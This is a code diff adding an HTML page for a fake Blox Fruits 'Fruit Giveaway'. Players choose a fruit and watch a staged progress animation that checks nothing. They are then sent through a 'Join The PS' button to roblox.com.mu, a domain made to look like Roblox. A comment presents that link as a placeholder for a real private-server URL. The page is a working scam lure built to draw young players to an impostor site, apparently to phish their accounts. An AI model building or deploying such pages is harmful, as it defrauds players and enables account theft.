@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Fruit Giveaway</title>
+<style>
+:root{--bg:#070b10;--panel:#0d1219;--card:#3b2b0c;--card2:#211b0d;--gold:#ffb000;--purple:#a855ff;--text:#f1f1f1;--muted:#8b95a3}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:radial-gradient(circle at 50% 20%,#171b22 0,#090d12 42%,#05080c 100%);color:var(--text)}
+body{overflow-x:hidden}
+header{position:sticky;top:0;z-index:5;background:rgba(12,16,21,.96);border-bottom:1px solid #2b3037;padding:22px 28px 18px;backdrop-filter:blur(12px)}
+.top{max-width:1180px;margin:auto;display:flex;gap:14px;align-items:center}
+.search{flex:1;height:62px;border:1px solid #37404b;border-radius:34px;background:#090e15;color:white;padding:0 24px;font-size:20px;outline:none;box-shadow:inset 0 0 20px rgba(0,0,0,.25)}
+.search::placeholder{color:#7f8895}
+.moon{font-size:28px;color:#9ca7b5;width:52px;text-align:center}
+main{max-width:1180px;margin:34px auto;padding:0 28px 70px}
+h1{text-align:center;font-size:30px;margin:12px 0 8px}
+.sub{text-align:center;color:var(--muted);margin-bottom:28px}
+.grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:28px}
+.card{position:relative;min-height:360px;border-radius:28px;background:linear-gradient(145deg,#49370f,#30230a);border:1px solid rgba(255,185,0,.07);box-shadow:0 15px 45px rgba(0,0,0,.42);display:flex;flex-direction:column;align-items:center;justify-content:center;padding:22px;cursor:pointer;transition:.18s transform,.18s box-shadow,.18s border-color}
+.card:hover{transform:translateY(-4px);box-shadow:0 20px 55px rgba(0,0,0,.55);border-color:rgba(255,176,0,.38)}
+.card.selected{outline:2px solid var(--gold);box-shadow:0 0 35px rgba(255,176,0,.18)}
+.fruit{width:220px;height:190px;object-fit:contain;mix-blend-mode:normal;border-radius:20px}
+.name{font-size:24px;font-weight:700;margin:8px 0 18px}
+.badge{border:1px solid var(--gold);color:var(--gold);border-radius:25px;padding:8px 20px;font-size:18px;font-weight:700}
+.getbar{position:sticky;bottom:18px;z-index:4;margin:28px auto 0;max-width:520px;display:flex;gap:12px;align-items:center;background:rgba(9,13,18,.94);padding:12px;border:1px solid #2e3742;border-radius:22px;box-shadow:0 15px 40px rgba(0,0,0,.6);backdrop-filter:blur(12px)}
+.chosen{flex:1;color:#aeb6c2;padding:0 8px}
+.chosen b{color:white}
+.get{border:0;border-radius:15px;background:white;color:#080b0f;font-weight:800;font-size:18px;padding:15px 30px;cursor:pointer;transition:.15s}
+.get:hover{transform:scale(1.03);box-shadow:0 0 22px rgba(255,255,255,.3)}
+.get:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}
+.hidden{display:none!important}
+.overlay{position:fixed;inset:0;z-index:20;background:rgba(3,6,10,.94);display:flex;align-items:center;justify-content:center;padding:24px}
+.modal{width:min(560px,100%);background:#0c1118;border:1px solid #303944;border-radius:28px;padding:34px;box-shadow:0 25px 90px rgba(0,0,0,.75);text-align:center}
+.spinner{width:70px;height:70px;margin:0 auto 22px;border-radius:50%;border:5px solid #2b333d;border-top-color:white;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.status{font-size:22px;font-weight:800;margin:10px 0 8px}
+.detail{color:#8994a1;margin-bottom:22px}
+.progress{height:12px;border-radius:10px;background:#202731;overflow:hidden}
+.progress>i{display:block;width:0;height:100%;background:white;border-radius:10px;transition:width .25s}
+.join{display:inline-block;margin-top:22px;padding:16px 30px;border-radius:16px;background:white;color:#080b0f;text-decoration:none;font-weight:900;font-size:18px;box-shadow:0 0 28px rgba(255,255,255,.14)}
+.note{font-size:12px;color:#65707e;margin-top:15px}
+@media(max-width:700px){
+ header{padding:20px 28px 18px}.search{height:62px;font-size:18px}
+ main{padding:0 28px 55px}.grid{gap:42px}
+ .card{min-height:345px;border-radius:28px}.fruit{width:205px;height:175px}.name{font-size:24px}
+ .getbar{margin-left:0;margin-right:0}
+}
+@media(max-width:470px){
+ .grid{gap:22px}.card{min-height:320px;padding:15px}.fruit{width:145px;height:145px}.name{font-size:19px}
+ .badge{font-size:15px;padding:7px 14px}.getbar{padding:9px}.get{padding:14px 19px}
+}
+</style>
+</head>
+<body>
+<header>
+  <div class="top">
+    <input id="search" class="search" placeholder="Search for fruits..." autocomplete="off">
+    <div class="moon">☾</div>
+  </div>
+</header>
+
+<main>
+  <h1>Choose a Fruit</h1>
+  <div class="sub">Pleas Select a fruit, then press <b>Get</b>.</div>
+  <section id="grid" class="grid"></section>
+  <div class="getbar">
+    <div id="chosen" class="chosen">No fruit selected</div>
+    <button id="getBtn" class="get" disabled>Get</button>
+  </div>
+</main>
+
+<div id="overlay" class="overlay hidden">
+  <div class="modal">
+    <div id="spinner" class="spinner"></div>
+    <div id="status" class="status">Processing...</div>
+    <div id="detail" class="detail">Preparing your request.</div>
+    <div id="progress" class="progress"><i></i></div>
+    <div id="result" class="hidden">
+      <a id="joinBtn" class="join" href="#" target="_blank" rel="noopener">Join The PS</a>
+      <div class="note">Join The Ps In Second Sea Bot will be waiting <b>thank you:))</b>.</div>
+    </div>
+  </div>
+</div>
+
+<script>
+const PRIVATE_SERVER_URL = "https://www.roblox.com.mu/games/2753915549/Blox-Fruits?privateServerLinkCode=96996576880726426999210967117714"; // Replace with your Roblox private-server URL.
+
+const fruits = [
+ ["Spirit","spirit","Mythical"],["Tiger","tiger","Mythical"],
+ ["Yeti","yeti","Mythical"],["Fiend","fiend","Mythical"],
+ ["Kitsune","kitsune","Mythical"],["Dragon","dragon","Mythical"],
+ ["T-Rex","trex","Mythical"],["Dough","dough","Mythical"],
+ ["Shadow","shadow","Mythical"],["Venom","venom","Mythical"],
+ ["Control","control","Mythical"],["Gas","gas","Mythical"],
+ ["Portal","portal","Legendary"],["Rumble","rumble","Legendary"],
+ ["Pain","pain","Legendary"],["Blizzard","blizzard","Legendary"],
+ ["Gravity","gravity","Mythical"],["Mammoth","mammoth","Mythical"]
+];
+
+let selected = null;
+const grid=document.getElementById("grid"), search=document.getElementById("search");
+const chosen=document.getElementById("chosen"), getBtn=document.getElementById("getBtn");
+
+function render(list=fruits){
+ grid.innerHTML="";
+ list.forEach(([name,img,rarity])=>{
+   const c=document.createElement("article"); c.className="card";
+   c.innerHTML=`<img class="fruit" src="assets/${img}.jpg" alt="${name}">
+     <div class="name">${name}</div><div class="badge">${rarity}</div>`;
+   c.onclick=()=>{
+     document.querySelectorAll(".card").forEach(x=>x.classList.remove("selected"));
+     c.classList.add("selected"); selected={name,img,rarity};
+     chosen.innerHTML=`Selected: <b>${name}</b>`;
+     getBtn.disabled=false;
+   };
+   grid.appendChild(c);
+ });
+}
+render();
+
+search.oninput=()=>{
+ const q=search.value.toLowerCase().trim();
+ render(fruits.filter(f=>f[0].toLowerCase().includes(q)));
+};
+
+getBtn.onclick=()=>{
+ if(!selected)return;
+ const overlay=document.getElementById("overlay"), status=document.getElementById("status");
+ const detail=document.getElementById("detail"), bar=document.querySelector("#progress i");
+ const spinner=document.getElementById("spinner"), result=document.getElementById("result");
+ const join=document.getElementById("joinBtn");
+ overlay.classList.remove("hidden"); result.classList.add("hidden"); spinner.classList.remove("hidden");
+ bar.style.width="0%"; join.href=PRIVATE_SERVER_URL;
+ let p=0;
+ const steps=[
+  ["Processing...", "Checking the selected fruit."],
+  ["Preparing...", "Preparing your private-server button."],
+  ["Finalizing...", "Almost finished."]
+ ];
+ let step=0;
+ const timer=setInterval(()=>{
+   p += Math.floor(Math.random()*10)+7;
+   if(p>=100)p=100;
+   bar.style.width=p+"%";
+   if(p<45) step=0; else if(p<78) step=1; else step=2;
+   status.textContent=steps[step][0]; detail.textContent=steps[step][1];
+   if(p>=100){
+     clearInterval(timer);
+     setTimeout(()=>{
+       spinner.classList.add("hidden"); status.textContent="Ready!";
+       detail.textContent=`${selected.name} is ready.`;
+       result.classList.remove("hidden");
+     },500);
+   }
+ },280);
+};
+</script>
+</body>
+</html>
